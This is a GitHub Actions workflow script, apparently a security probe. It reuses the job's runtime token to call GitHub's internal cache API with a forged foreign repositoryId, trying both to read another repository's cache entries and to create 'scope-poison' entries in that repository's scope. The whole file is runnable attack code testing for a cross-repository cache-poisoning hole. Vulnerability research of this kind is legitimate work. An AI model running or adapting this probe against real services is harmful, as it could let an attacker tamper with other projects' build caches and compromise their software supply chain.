name: Cache Scope Boundary Test v4
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  cache-scope:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const crypto = require('crypto');
            const env = process.env;
            const resultsUrl = env.ACTIONS_RESULTS_URL;
            const token = env.ACTIONS_RUNTIME_TOKEN;
            
            if (!resultsUrl || !token) {
              console.log('ERROR: Missing env vars');
              return;
            }
            
            // Generate a proper version hash (SHA-256, 64 hex chars)
            const version = crypto.createHash('sha256').update('/tmp/test-cache|zstd').digest('hex');
            console.log('Version hash:', version);
            
            const twirpBase = `${resultsUrl}twirp/github.actions.results.api.v1.CacheService`;
            const headers = {
              'Authorization': `Bearer ${token}`,
              'Content-Type': 'application/json'
            };
            
            // Test 1: Normal lookup (no metadata) - baseline
            console.log('\n=== T1: Normal lookup (baseline) ===');
            const r1 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
              method: 'POST', headers,
              body: JSON.stringify({key: 'probe-normal', version})
            });
            console.log(`${r1.status}: ${(await r1.text()).substring(0, 300)}`);
            
            // Test 2: Own repository_id from JWT (should behave same as T1)
            console.log('\n=== T2: Own repositoryId (1187665881) ===');
            const r2 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
              method: 'POST', headers,
              body: JSON.stringify({
                key: 'probe-own', version,
                metadata: {repositoryId: '1187665881', scope: [{scope: 'refs/heads/main', permission: 3}]}
              })
            });
            console.log(`${r2.status}: ${(await r2.text()).substring(0, 300)}`);
            
            // Test 3: FOREIGN repositoryId (different repo)
            console.log('\n=== T3: Foreign repositoryId (1187665821) ===');
            const r3 = await fetch(`${twirpBase}/GetCacheEntryDownloadURL`, {
              method: 'POST', headers,
              body: JSON.stringify({
                key: 'probe-foreign', version,
                metadata: {repositoryId: '1187665821', scope: [{scope: 'refs/heads/main', permission: 3}]}
              })
            });
            console.log(`${r3.status}: ${(await r3.text()).substring(0, 300)}`);
            
            // Test 4: CreateCacheEntry normal (no metadata)
            console.log('\n=== T4: CreateCacheEntry normal ===');
            const r4 = await fetch(`${twirpBase}/CreateCacheEntry`, {
              method: 'POST', headers,
              body: JSON.stringify({key: `scope-test-${Date.now()}`, version})
            });
            const t4 = await r4.text();
            console.log(`${r4.status}: ${t4.substring(0, 300)}`);
            
            // Test 5: CreateCacheEntry with foreign repositoryId
            console.log('\n=== T5: CreateCacheEntry foreign repoId ===');
            const r5 = await fetch(`${twirpBase}/CreateCacheEntry`, {
              method: 'POST', headers,
              body: JSON.stringify({
                key: `scope-poison-${Date.now()}`, version,
                metadata: {repositoryId: '1187665821', scope: [{scope: 'refs/heads/main', permission: 3}]}
              })
            });
            const t5 = await r5.text();
            console.log(`${r5.status}: ${t5.substring(0, 300)}`);
            
            // CRITICAL COMPARISON: Are T1/T2 responses different from T3/T5?
            console.log('\n=== VERDICT ===');
            console.log('If T3/T5 return different errors than T1/T2, scope is enforced');
            console.log('If T3/T5 return same responses as T1/T2, metadata.repositoryId is IGNORED');
            console.log('If T3/T5 return success with foreign data, CRITICAL VULNERABILITY');
